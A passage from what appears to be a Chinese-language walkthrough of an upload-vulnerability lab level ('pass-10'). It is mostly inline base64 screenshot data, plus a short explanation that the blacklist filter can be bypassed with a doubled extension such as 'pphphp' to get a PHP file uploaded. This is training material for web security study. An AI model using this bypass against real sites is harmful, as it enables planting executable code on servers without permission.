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" alt="img"></p>
<h5 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h5><p>分析代码可知代码使用了黑名单设置,对文件名中包含的黑名单中的后缀使用trim函数进行移除,所以思路就是写一个被移除后正好能变成可解析后缀的文件名即可,如,pphphp<img src="data:image/png;base64,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